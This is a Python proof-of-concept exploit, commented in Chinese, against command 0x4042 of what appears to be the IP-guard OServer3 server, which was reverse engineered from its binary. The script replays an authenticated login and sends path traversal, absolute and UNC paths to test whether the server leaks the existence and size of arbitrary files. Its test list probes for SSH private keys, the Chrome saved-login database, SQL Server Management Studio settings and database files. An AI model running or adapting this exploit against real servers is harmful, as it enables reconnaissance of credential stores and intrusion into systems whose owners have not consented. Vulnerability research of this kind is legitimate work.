"""poc_4042_path_oracle.py — 验证 cmd=0x4042 是否任意路径 stat oracle

依据 IDA 反编译 sub_1404C4520:
  body = wcs (utf-16-le + NUL) 直接 → concat 到 OServer3 install dir → CreateFileW
  路径无 sandbox / traversal 校验 → 可用 ..\\ 跳出 install dir
  response = 16B {ptr_low(8B), size(4B), version(4B)}

测试用例:
  baseline:    "OConsole3.exe"  (相对路径, 应该 size > 0)
  bogus:       "thisfiledoesnotexist.xxx"  (应该 size = 0)
  traversal:   "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"  (跳出安装目录读 hosts)
  absolute:    "C:\\Windows\\System32\\drivers\\etc\\hosts"  (试绝对路径,可能也通)

用法:
  python poc_4042_path_oracle.py 192.168.2.130 8236 Admin admin123456
"""
import os, socket, struct, sys, zlib

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import build_packet_with_state, recv_full_packet, parse_packet


def fresh_session(host, port, user, pwd, timeout=15.0):
    base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    idx, lr, st, _ = replay_login(s, user, pwd, base_nonce, show_crypto=False, verbose=False)
    return s, base_nonce, idx, lr, st


def query_4042(host, port, user, pwd, filename):
    s, bn, idx, lr, st = fresh_session(host, port, user, pwd)
    try:
        wcs = filename.encode("utf-16-le") + b"\x00\x00"
        next_nonce = (bn + idx) & 0xFFFFFFFF
        pkt = build_packet_with_state(
            flags=0x4600, a2=0x4042, a3=0, nonce=next_nonce,
            sess_state_16_24=struct.pack("<II", lr, st),
            fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
            plain=wcs,
        )
        s.sendall(pkt)
        return parse_packet(recv_full_packet(s))
    finally:
        try: s.close()
        except: pass


def parse_4042_resp(r):
    if not isinstance(r, dict): return None
    plain = r.get("plain", b"")
    if not isinstance(plain, bytes) or len(plain) < 16:
        return None
    ptr_low = struct.unpack_from("<Q", plain, 0)[0]
    size = struct.unpack_from("<I", plain, 8)[0]
    version = struct.unpack_from("<I", plain, 12)[0]
    return {"ptr_low": hex(ptr_low), "size": size, "version": hex(version), "raw": plain.hex()}


def fmt(r):
    if not isinstance(r, dict): return "<no resp>"
    fl = r.get("flags", 0); plen = r.get("payload_len", 0)
    err = "ERR" if (fl & 0x0002) else "OK"
    return f"flags=0x{fl:04x}[{err}] plen={plen}"


def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd = sys.argv[3], sys.argv[4]

    # 测试用例
    tests = [
        # (label, filename)
        ("baseline-exists",    "OConsole3.exe"),
        ("baseline-special1",  "UpdateInfo.zip"),
        ("baseline-special2",  "TSecBxLibV4_OServer.dat"),
        ("baseline-bogus",     "thisfiledoesnotexist_zxcvbn.xxx"),
        # 相对 traversal
        ("traversal-1",  "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"),
        ("traversal-2",  "..\\..\\..\\..\\Windows\\win.ini"),
        ("traversal-3",  "..\\..\\..\\..\\..\\boot.ini"),
        ("traversal-4",  "..\\..\\Users\\admin\\Desktop\\1.txt"),
        # 绝对路径
        ("absolute-1",   "C:\\Windows\\System32\\drivers\\etc\\hosts"),
        ("absolute-2",   "C:\\Windows\\win.ini"),
        ("absolute-3",   "C:\\Windows\\System32\\notepad.exe"),
        ("absolute-bogus", "C:\\nonexistent_zxcvbn.xyz"),
        # UNC (跨网络读)
        ("unc",          "\\\\127.0.0.1\\C$\\Windows\\System32\\notepad.exe"),
        # SQL DB MDF (用 traversal,3 层深的 install dir 标准布局)
        ("dbmdf-trav3",  "..\\..\\..\\OCULAR3_DATA.20260324.MDF"),
        ("dbmdf-trav4",  "..\\..\\..\\..\\OCULAR3_DATA.20260324.MDF"),
        ("dbldf-trav3",  "..\\..\\..\\OCULAR3_DATA.20260324_Log.LDF"),
        # Same-file twice 验证 hash 是不是稳定 (content-based vs timestamp-based)
        ("hash-stable-1", "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"),
        ("hash-stable-2", "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"),
        # 试一些敏感文件存在性探测
        ("ssh-key",      "..\\..\\..\\Users\\admin\\.ssh\\id_rsa"),
        ("chrome-creds", "..\\..\\..\\Users\\admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"),
        ("ssms-cred",    "..\\..\\..\\Users\\admin\\AppData\\Roaming\\Microsoft\\SQL Server Management Studio\\18.0\\UserSettings.xml"),
        ("ipguard-ini",  "OServer3.ini"),
        ("ipguard-log",  "..\\..\\..\\ProgramData\\Ocular\\Server.log"),
    ]

    print(f"{'label':<22} {'filename':<55} {'flags':<22} {'size':<12} {'version':<12}")
    print("-" * 130)
    for label, fname in tests:
        try:
            r = query_4042(host, port, user, pwd, fname)
        except Exception as e:
            print(f"{label:<22} {fname[:55]:<55} EXC: {e}")
            continue
        parsed = parse_4042_resp(r) if isinstance(r, dict) else None
        flagstr = fmt(r)
        size = parsed["size"] if parsed else 0
        ver = parsed["version"] if parsed else "?"
        marker = "✅" if (parsed and size > 0) else "  "
        print(f"{marker} {label:<20} {fname[:55]:<55} {flagstr:<22} {size:<12} {ver}")
        if parsed and size > 0:
            print(f"      raw: {parsed['raw']}")


if __name__ == "__main__":
    main()
